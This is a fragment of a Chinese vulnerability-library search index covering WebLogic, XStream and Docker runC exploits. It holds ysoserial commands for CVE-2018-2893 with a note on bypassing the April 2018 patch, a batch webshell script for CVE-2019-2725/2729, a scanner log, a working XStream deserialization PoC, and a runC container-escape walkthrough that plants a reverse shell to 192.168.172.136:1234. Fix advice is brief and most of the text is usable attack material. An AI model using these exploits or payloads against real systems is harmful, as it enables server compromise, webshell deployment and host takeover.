<p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/CVE-2018-2893/","title":"CVE-2018-2893","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/CVE-2018-2893/#tools-author","title":"Tools author","text":"<p>https://github.com/pyn3rd/CVE-2018-2893</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/CVE-2018-2893/#step-1","title":"Step 1","text":"<p><code>java -jar ysoserial-cve-2018-2893.jar</code></p> <pre><code>WHY SO SERIAL?\nUsage: java -jar ysoserial-[version]-all.jar [payload] '[command]'\nAvailable payload types:\n     Payload     Authors   Dependencies\n     -------     -------   ------------\n     JRMPClient  @mbechler\n     JRMPClient2 \n     JRMPClient3 \n     JRMPClient4 \n     Jdk7u21     @frohoff\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/CVE-2018-2893/#step-2","title":"Step 2","text":"<p><code>java -jar ysoserial-cve-2018-2893.jar  JRMPClient4 \"&lt;ip&gt;:&lt;port&gt;\" &gt; poc4.ser</code></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/CVE-2018-2893/#step-3","title":"Step 3","text":"<p><code>python weblogic.py &lt;host&gt; &lt;port&gt; poc4.ser</code></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/CVE-2018-2893/#note-any-one-of-jrmpclient2jrmpclient3jrmpclient4-can-be-utilized-to-bypass-the-critical-patch-update-april-2018","title":"Note: Any one of  JRMPClient2|JRMPClient3|JRMPClient4 can be utilized to  bypass the Critical Patch Update April 2018.","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/Weblogic-2019-2725-2729/","title":"Index","text":"<pre><code>weblogic CVE-2019-2725 CVE-2019-2729 POC\n\u6267\u884c\u547d\u4ee4\u5e76\u56de\u663e\n\nusage:\n\u5355\u4e2a\u76ee\u6807\npython3 weblogic_get_webshell.py http://url\n\u6279\u91cf\u76ee\u6807\uff0c\u5c06\u6279\u91cfurl\u653e\u5165url_list.txt\npython3 weblogic_get_webshell.py all\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/WeblogicScanLot/","title":"Index","text":"<pre><code>\u8f6f\u4ef6\u4f5c\u8005\uff1aTide_RabbitMask\n\u514d\u8d23\u58f0\u660e\uff1aPia!(\uff4f \u2035-\u2032)\u30ce\u201d(\u30ce\ufe4f&lt;\u3002)\n\u672c\u5de5\u5177\u4ec5\u7528\u4e8e\u5b89\u5168\u6d4b\u8bd5\uff0c\u8bf7\u52ff\u7528\u4e8e\u975e\u6cd5\u4f7f\u7528\uff0c\u8981\u4e56\u54e6~\n\nV2.2\u7b80\u4ecb\uff1a\n\u63d0\u4f9bweblogic\u6279\u91cf\u68c0\u6d4b\u529f\u80fd\uff0c\u6536\u5f55\u51e0\u4e4e\u5168\u90e8weblogic\u5386\u53f2\u6f0f\u6d1e\u3002\n\u3010\u6ca1\u6709\u9047\u5230\u8fc7weblogic\u6279\u91cf\u68c0\u6d4b\u5de5\u5177\u7684\u5c0f\u670b\u53cb\u4e3e\u8d77\u4f60\u7684\u722a\u722a\uff01\u3011\n\nPS\uff1a\n\u7efc\u4e0a:V2.*\u7cfb\u5217\u4e0d\u662fV1.*\u7684\u5347\u7ea7\u7248\uff0c\u53ea\u662f\u591a\u8fdb\u7a0b\u6279\u91cf\u7248\u672c\u3002\n\u5bf9\u4e8e\u5f53\u4e2a\u76ee\u6807\u7ad9\u70b9\u7684\u68c0\u6d4b\uff0c\u4f9d\u7136\u63a8\u8350\u60a8\u4f7f\u7528V1.*\u7cfb\u5217\u3002\n\nV 2.*\u7cfb\u5217\u7279\u8272\uff1a\n    1.\u591a\u8fdb\u7a0b\u4efb\u52a1\u9ad8\u6548\u5e76\u53d1\n    2.\u7b80\u6d01\u76f4\u89c2\u7684\u76d1\u63a7\u754c\u9762\n    3.\u5065\u5168\u7684\u65e5\u5fd7\u8bb0\u5f55\u529f\u80fd\n    4.\u5065\u5168\u7684\u5f02\u5e38\u5904\u7406\u673a\u5236\n\nV 2.*\u529f\u80fd\u8be6\u60c5\uff1a\n    #\u63a7\u5236\u53f0\u8def\u5f84\u6cc4\u9732\n    Console\n\n    #SSRF\uff1a\n    CVE-2014-4210\n\n    #JAVA\u53cd\u5e8f\u5217\u5316\n    CVE-2016-0638  \n    CVE-2016-3510   \n    CVE-2017-3248   \n    CVE-2018-2628 \n    CVE-2018-2893\n    CVE-2019-2725\n    CVE-2019-2729\n\n    #\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\n    CVE-2018-2894\n\n    #XMLDecoder\u53cd\u5e8f\u5217\u5316\n    CVE-2017-3506\n    CVE-2017-10271\n\nV 2.1\u66f4\u65b0\u65e5\u5fd7\uff1a\n    \u7cfb\u5217\u91cd\u65b0\u5b9a\u4e49\u4e3aWeblogicScanLot\u7248\u672c\u3002\n    \u65b0\u589e\u5927\u91cf\u6210\u719fPOC\uff0c\u4e0eV1.3\u4fdd\u6301\u4e00\u81f4\u3002\n    \u540c\u6837\u65b0\u7248\u672c\u5b8c\u5168\u820d\u5f03Python2\u3002\n    \u65e5\u5fd7\u529f\u80fd\u91cd\u6784\uff0c\u66f4\u52a0\u5065\u58ee\u5b9e\u7528\u3002\n    Kill\u65e7\u7248\u672cwindow\u4e0b\u591a\u8fdb\u7a0b\u9002\u5e94\u6027BUG\n\nV 2.2\u66f4\u65b0\u65e5\u5fd7\uff1a\n    \u65e5\u5fd7\u8f93\u51fa\u91cd\u505a\uff0c\u4e4b\u524d\u7684\u7248\u672c\u8fc1\u79fb\u5bfc\u81f4\u65e5\u5fd7\u5e76\u4e0d\u9002\u5408\u4f5c\u4e3a\u6279\u91cf\u626b\u63cf\u7ed3\u679c\uff0c\n    \u5e0c\u671b\u8fd9\u6b21\u6539\u52a8\u53ef\u4ee5\u6ee1\u8db3\u5404\u4f4d\u8981\u6c42\uff0c\u5982\u6709bug issue\u7ee7\u7eed\u5b89\u6392~\u611f\u8c22\uff01\n\n\n\u3010\u8f6f\u4ef6\u4f7f\u7528Demo\u3011\n\u3010\u6b64\u5904\u53ea\u63d0\u4f9b\u4e86\u672c\u673a\u5355\u673a\u626b\u63cfdemo\uff0c\u591a\u7ebf\u7a0b\u5b9e\u6218\u573a\u9762\u592a\u8fc7\u8840\u8165\uff0c\u8bf7\u5728\u5bb6\u957f\u966a\u540c\u4e0b\u81ea\u884c\u4f53\u9a8c\u3011\n\n#\u63a7\u5236\u53f0\uff1a\n=========================================================================\n__        __   _     _             _        ____\n\\ \\      / /__| |__ | | ___   __ _(_) ___  / ___|  ___ __ _ _ __\n \\ \\ /\\ / / _ \\ '_ \\| |/ _ \\ / _` | |/ __| \\___ \\ / __/ _` | '_ \\\n  \\ V  V /  __/ |_) | | (_) | (_| | | (__   ___) | (_| (_| | | | |\n   \\_/\\_/ \\___|_.__/|_|\\___/ \\__, |_|\\___| |____/ \\___\\__,_|_| |_|\n                             |___/\n                             By Tide_RabbitMask | V 2.2\n\n\nWelcome To WeblogicScan !!!\nWhoami\uff1arabbitmask.github.io\n\n[*]\u4efb\u52a1\u52a0\u8f7d\u6210\u529f\uff0c\u76ee\u6807:127.0.0.1:7001\n\n[*]\u4efb\u52a1\u68c0\u6d4b\u5b8c\u6210\uff0c\u76ee\u6807:127.0.0.1:7001\n\n&gt;&gt;&gt;&gt;&gt;End of task\n\n=========================================================================\n\n#\u65e5\u5fd7\u6587\u4ef6\uff1a\n=========================================================================\n\n2019-07-28 14:57:48,702 [+]127.0.0.1:7001 console address is exposed! The path is: http://127.0.0.1:7001/console/login/LoginForm.jsp Please try weak password blasting!\n2019-07-28 14:57:48,717 [+]127.0.0.1:7001 UDDI module is exposed! The path is: http://127.0.0.1:7001/uddiexplorer/ Please verify the SSRF vulnerability!\n2019-07-28 14:57:48,717 [-]127.0.0.1:7001 not detected CVE_2016_0638.\n2019-07-28 14:57:48,717 [-]127.0.0.1:7001 not detected CVE_2016_3510.\n2019-07-28 14:57:48,717 [-]127.0.0.1:7001 not detected CVE_2017_3248.\n2019-07-28 14:57:48,725 [-]127.0.0.1:7001 not detected CVE-2017-3506.\n2019-07-28 14:57:48,731 [-]127.0.0.1:7001 not detected CVE-2017-10271.\n2019-07-28 14:57:48,731 [-]127.0.0.1:7001 not detected CVE_2018_2628.\n2019-07-28 14:57:48,731 [-]127.0.0.1:7001 not detected CVE_2018_2893.\n2019-07-28 14:57:48,735 [-]127.0.0.1:7001 not detected CVE-2018-2894.\n2019-07-28 14:57:48,914 [+]127.0.0.1:7001 has a JAVA deserialization vulnerability:CVE-2019-2725.\n2019-07-28 14:57:49,133 [+]And your current permission is:rabbitmask\\rabbitmask.\n2019-07-28 14:57:51,356 [+]127.0.0.1:7001 has a JAVA deserialization vulnerability:CVE-2019-2729.\n2019-07-28 14:57:51,356 [+]And your current permission is:rabbitmask\\rabbitmask.\n\n\n=========================================================================\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/cve-2017-10271/","title":"\u6f0f\u6d1e\u7f16\u53f7","text":"<p>CVE-2017-10271</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/cve-2017-10271/#_2","title":"\u5f71\u54cd\u8303\u56f4","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/cve-2017-10271/#_3","title":"\u5229\u7528","text":"<p>get\u8bf7\u6c42/wls-wsat/CoordinatorPortType\u754c\u9762\u521d\u6b65\u5224\u5b9a</p> <p>\u6293\u5305\u6dfb\u52a0http\u5934 Upgrade-Insecure-Requests: 1 Content-Type:text/xml</p> <p>\u4fee\u6539get\u4e3apost\u63d0\u4ea4payload</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/XStream/CVE-2019-10173%20Xstream%201.4.10%E7%89%88%E6%9C%AC%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","title":"CVE 2019 10173 Xstream 1.4.10\u7248\u672c\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/XStream/CVE-2019-10173%20Xstream%201.4.10%E7%89%88%E6%9C%AC%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_1","title":"\u524d\u8a00","text":"<p>XStream\u662f\u5e38\u7528\u7684Java\u7c7b\u5e93\uff0c\u7528\u6765\u5c06\u5bf9\u8c61\u5e8f\u5217\u5316\u6210XML \uff08JSON\uff09\u6216\u53cd\u5e8f\u5217\u5316\u4e3a\u5bf9\u8c61\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/XStream/CVE-2019-10173%20Xstream%201.4.10%E7%89%88%E6%9C%AC%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_2","title":"\u6f0f\u6d1e\u7b80\u4ecb","text":"<p>Xstream 1.4.10\u7248\u672c\u5b58\u5728\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1eCVE-2013-7285\u8865\u4e01\u7ed5\u8fc7\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/XStream/CVE-2019-10173%20Xstream%201.4.10%E7%89%88%E6%9C%AC%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_3","title":"\u6f0f\u6d1e\u5371\u5bb3","text":"<p>\u5f53\u4f7f\u7528Xstream 1.4.10\u7248\u672c\u4e14\u672a\u5bf9\u5b89\u5168\u6846\u67b6\u8fdb\u884c\u521d\u59cb\u5316\u65f6\uff0c\u653b\u51fb\u8005\u5373\u53ef\u901a\u8fc7\u7cbe\u5fc3\u6784\u9020\u7684\u8bf7\u6c42\u5305\u5728\u4f7f\u7528Xstream\u7684\u670d\u52a1\u5668\u4e0a\u8fdb\u884c\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/XStream/CVE-2019-10173%20Xstream%201.4.10%E7%89%88%E6%9C%AC%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_4","title":"\u5f71\u54cd\u8303\u56f4","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/XStream/CVE-2019-10173%20Xstream%201.4.10%E7%89%88%E6%9C%AC%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_5","title":"\u4ea7\u54c1","text":"<p>Xstream</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/XStream/CVE-2019-10173%20Xstream%201.4.10%E7%89%88%E6%9C%AC%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_6","title":"\u7248\u672c","text":"<p>Xstream1.4.10\u7248\u672c</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/XStream/CVE-2019-10173%20Xstream%201.4.10%E7%89%88%E6%9C%AC%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_7","title":"\u7ec4\u4ef6","text":"<p>Xstream</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/XStream/CVE-2019-10173%20Xstream%201.4.10%E7%89%88%E6%9C%AC%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_8","title":"\u6f0f\u6d1e\u590d\u73b0","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/XStream/CVE-2019-10173%20Xstream%201.4.10%E7%89%88%E6%9C%AC%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#poc","title":"PoC","text":"<pre><code>package com.bigo;\n\nimport com.thoughtworks.xstream.XStream;\n\nimport java.beans.EventHandler;\nimport java.io.IOException;\nimport java.util.Set;\nimport java.util.TreeSet;\n\n/**\n * Created by cfchi on 2019/7/26.\n */\npublic class Main {\n    public static String expGen(){\n        XStream xstream = new XStream();\n        Set&lt;Comparable&gt; set = new TreeSet&lt;Comparable&gt;();\n        set.add(\"foo\");\n        set.add(EventHandler.create(Comparable.class, new ProcessBuilder(\"calc\"), \"start\"));\n        String payload = xstream.toXML(set);\n        System.out.println(payload);\n        return payload;\n    }\n    public static void main(String[] args) throws IOException {\n        expGen();\n        XStream xStream = new XStream();\n        String payload = \"&lt;sorted-set&gt;\\n\" +\n                \"    &lt;string&gt;foo&lt;/string&gt;\\n\" +\n                \"    &lt;dynamic-proxy&gt;\\n\" +\n                \"    &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;\\n\" +\n                \"        &lt;handler class=\\\"java.beans.EventHandler\\\"&gt;\\n\" +\n                \"            &lt;target class=\\\"java.lang.ProcessBuilder\\\"&gt;\\n\" +\n                \"                &lt;command&gt;\\n\" +\n                \"                    &lt;string&gt;cmd.exe&lt;/string&gt;\\n\" +\n                \"                    &lt;string&gt;/c&lt;/string&gt;\\n\" +\n                \"                    &lt;string&gt;calc&lt;/string&gt;\\n\" +\n                \"                &lt;/command&gt;\\n\" +\n                \"            &lt;/target&gt;\\n\" +\n                \"     &lt;action&gt;start&lt;/action&gt;\"+\n                \"        &lt;/handler&gt;\\n\" +\n                \"    &lt;/dynamic-proxy&gt;\\n\" +\n                \"&lt;/sorted-set&gt;\\n\";\n       xStream.fromXML(payload);\n    }\n}\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/XStream/CVE-2019-10173%20Xstream%201.4.10%E7%89%88%E6%9C%AC%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#147","title":"1.4.7\u7248\u672c\u767d\u540d\u5355","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/XStream/CVE-2019-10173%20Xstream%201.4.10%E7%89%88%E6%9C%AC%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#1410","title":"1.4.10\u7248\u672c\uff0c\u9ed1\u540d\u5355\u672a\u5f00\u542f","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/XStream/CVE-2019-10173%20Xstream%201.4.10%E7%89%88%E6%9C%AC%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#1411","title":"1.4.11\u7248\u672c\uff0c\u9ed1\u540d\u5355\u5f00\u542f","text":"<p>blacklist</p> <pre><code>private class InternalBlackList implements Converter {\n    private InternalBlackList() {\n    }\n\n    public boolean canConvert(Class type) {\n        return type == Void.TYPE || type == Void.class || !XStream.this.securityInitialized &amp;&amp; type != null &amp;&amp; (type.getName().equals(\"java.beans.EventHandler\") || type.getName().endsWith(\"$LazyIterator\") || type.getName().startsWith(\"javax.crypto.\"));\n    }\n\n    public void marshal(Object source, HierarchicalStreamWriter writer, MarshallingContext context) {\n        throw new ConversionException(\"Security alert. Marshalling rejected.\");\n    }\n\n    public Object unmarshal(HierarchicalStreamReader reader, UnmarshallingContext context) {\n        throw new ConversionException(\"Security alert. Unmarshalling rejected.\");\n    }\n}\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/XStream/CVE-2019-10173%20Xstream%201.4.10%E7%89%88%E6%9C%AC%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_9","title":"\u4fee\u590d\u65b9\u6848","text":"<p>\u5347\u7ea7Xstream\u52301.4.11\u7248\u672c</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/XStream/CVE-2019-10173%20Xstream%201.4.10%E7%89%88%E6%9C%AC%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_10","title":"\u53c2\u8003","text":"<p>https://mp.weixin.qq.com/s/bght8tIwtNqnaidVZjPdSw http://x-stream.github.io/changes.html#1.4.11</p> <p>\u539f\u6587\uff1ahttp://www.polaris-lab.com/index.php/archives/658/</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/docker/docker-runC%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9ECVE-2019-5736/","title":"docker runC\u5bb9\u5668\u9003\u9038\u6f0f\u6d1eCVE 2019 5736","text":"<p>\u6f0f\u6d1e\u7b80\u8ff0\uff1a</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u7279\u5b9a\u7684\u5bb9\u5668\u955c\u50cf\u6216\u8005exec\u64cd\u4f5c\u53ef\u4ee5\u83b7\u53d6\u5230\u5bbf\u4e3b\u673a\u7684runC\u6267\u884c\u65f6\u7684\u6587\u4ef6\u53e5\u67c4\u5e76\u4fee\u6539\u6389runc\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u4ece\u800c\u83b7\u53d6\u5230\u5bbf\u4e3b\u673a\u7684root\u6267\u884c\u6743\u9650\u3002</p> <p>\u5229\u7528\u6761\u4ef6\uff1a</p> <p>Docker\u7248\u672c &lt; 18.09.2\uff0crunC\u7248\u672c&lt; 1.0-rc6\u3002\uff08\u5728Docker 18.09.2\u4e4b\u524d\u7684\u7248\u672c\u4e2d\u4f7f\u7528\u4e86\u7684runc\u7248\u672c\u5c0f\u4e8e1.0-rc6\u3002\uff09</p> <p>\u53ef\u901a\u8fc7 docker \u548cdocker-runc \u67e5\u770b\u5f53\u524d\u7248\u672c\u60c5\u51b5\u3002</p> <p></p> <p>\u6f0f\u6d1e\u6d4b\u8bd5\u590d\u73b0\uff1a</p> <p>1\u3001\u6f0f\u6d1e\u73af\u5883\u51c6\u5907\uff1a</p> <pre><code>curl https://gist.githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw -o install.sh &amp;&amp; bash install.sh\n</code></pre> <p>\u6216\u8005\u76f4\u63a5\u4e0b\u8f7d\u811a\u672c\u5b89\u88c5</p> <pre><code>chmod 777 install.sh &amp;&amp; ./install.sh\n</code></pre> <p>install.sh \u5185\u5bb9\u5982\u4e0b\uff1a</p> <pre><code>#!/bin/bash\n# date: 20190523\n# author: thinkycx\n# Description: you can use this to install vulnerable docker ( CVE-2019-5736 docker runc escape )\n#              tested on centos7/ubuntu16.04\n# Usage:\n#       1. curl https://gist.githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw -o install.sh &amp;&amp; bash install.sh\n#       2. run docker_escape in docker container\n# \n\n\n\n_centos_docker_old_version(){\n    sudo yum install containerd.io\n    wget https://download.docker.com/linux/centos/7/x86_64/stable/Packages/docker-ce-18.06.0.ce-3.el7.x86_64.rpm\n    sudo yum install docker-ce-18.06.0.ce-3.el7.x86_64.rpm\n    # sudo yum install docker-ce-cli\n    # I cannot find a version matches with the docker-ce, so I didn't install it.\n\n    # docker --version\n    # Docker version 18.06.0-ce, build 0ffa825\n\n    # more info\n    # It seems that we can use the scirpt to install docker. I haven't tested it.\n    # apt-get -y install curl\n    # curl -fsSL test.docker.com -o test-docker.sh\n    # VERSION=18.03.1 sh test-docker.sh\n}\n\ncentos_install_docker(){\n    # date 20190523\n    # ref https://docs.docker.com/install/linux/docker-ce/centos/#install-using-the-convenience-script\n    echo \"[*] uninstall old...\"\n    sudo yum remove docker \\\n                  docker-client \\\n                  docker-client-latest \\\n                  docker-common \\\n                  docker-latest \\\n                  docker-latest-logrotate \\\n                  docker-logrotate \\\n                  docker-engine\n    # The contents of /var/lib/docker/, including images, containers, volumes, and networks, are preserved. \n    # The Docker CE package is now called docker-ce\n\n    # Install using the repository\n    ## SET UP THE REPOSITORY\n    ### Install required packages. yum-utils provides the yum-config-manager utility\n    sudo yum install -y yum-utils \\\n                device-mapper-persistent-data \\\n                lvm2\n    ### set up the stable repository.\n    sudo yum-config-manager \\\n    --add-repo \\\n    https://download.docker.com/linux/centos/docker-ce.repo\n\n\n    # install a specific version of Docker CE\n    #yum list docker-ce --showduplicates | sort -r\n\n    # sudo yum install docker-ce-&lt;VERSION_STRING&gt; docker-ce-cli-&lt;VERSION_STRING&gt; containerd.io\n    # e.g docker-ce-18.09.1\n    #sudo yum install docker-ce-18.09.6 docker-ce-cli-18.09.6 containerd.io\n\n    # check  GPG key, verify that the fingerprint matches\n    # 060A 61C5 1B55 8A7F 742B 77AA C52F EB6B 621E 9F35\n\n    _centos_docker_old_version\n\n    sudo systemctl start docker\n}\n\nubuntu_install_docker(){\n    # use script to install docker on ubuntu\n    curl -fsSL https://get.docker.com -o get-docker.sh &amp;&amp; \\\n    sudo VERSION=18.06.0 sh get-docker.sh\n    sudo systemctl start docker\n\n}\n\n\ninstall_dependencies(){\n        source /etc/os-release\n        echo \"OS: \", $ID \n        if [ $ID == \"centos\" ]; then\n          centos_install_docker\n        elif [ $ID == \"ubuntu\" ]; then\n          ubuntu_install_docker\n        else\n          echo \"[!] cannot support your OS.\"\n          exit\n        fi \n        echo \"[*] start to run docker...\"\n        docker run -it ubuntu:18.04 \"/bin/bash\" \n}\n\n\n# bash main...\ninstall_dependencies\n\n# Please run it manually in docker container.\ndocker_escape(){\n    # run commands in container as to escape docker container . \n    # yous should compile POC yourself\n    # https://github.com/Frichetten/CVE-2019-5736-PoC\n    # compile main.go on macOS :\n    # $ CGO_ENABLED=0 GOOS=linux GOARCH=amd64  go build -o poc main.go \n    apt-get update -y &amp;&amp; \\\n    apt-get install curl -y  &amp;&amp; \\\n    apt-get install libseccomp-dev -y \n\n    curl URL -o poc &amp;&amp; \\            \n    chmod u+x ./poc\n    ./poc\n}\n</code></pre> <p>2\u3001\u4e0b\u8f7dPOC\uff0c\u7f16\u8bd1\u811a\u672c</p> <pre><code># \u4e0b\u8f7dPOC\ngit clone https://github.com/Frichetten/CVE-2019-5736-PoC\n\n# \u4fee\u6539Payload\nvi main.go\npayload = \"#!/bin/bash \\n bash -i &gt;&amp; /dev/tcp/192.168.172.136/1234 0&gt;&amp;1\"\n\n# \u7f16\u8bd1\u751f\u6210payload\nCGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go\n</code></pre> <p>3\u3001\u6a21\u4eff\u653b\u51fb\u8005\uff0c\u5728\u5bb9\u5668\u4e2d\u6267\u884cpayload</p> <pre><code># \u62f7\u8d1d\u5230docker\u5bb9\u5668\nsudo docker cp ./main 248f8b7d3c45:/tmp\n\n# \u8fdb\u5165\u5bb9\u5668\nsudo docker exec -it 248f8b7d3c45 /bin/bash# \u4fee\u6539\u6743\u9650chmod 777 main# \u6267\u884cPayload./main\n</code></pre> <p></p> <p>4\u3001\u5047\u8bbe\uff0c\u7ba1\u7406\u5458\u901a\u8fc7exec\u8fdb\u5165\u5bb9\u5668\uff0c\u4ece\u800c\u89e6\u53d1Payload\u3002</p> <pre><code>sudo docker exec -it  cafa20cfb0f9 /bin/sh\n</code></pre> <p>5\u3001\u5728192.168.172.136\u4e0a\u76d1\u542c\u672c\u5730\u7aef\u53e3\uff0c\u6210\u529f\u83b7\u53d6\u5bbf\u4e3b\u673a\u53cd\u5f39\u56de\u6765\u7684shell\u3002</p> 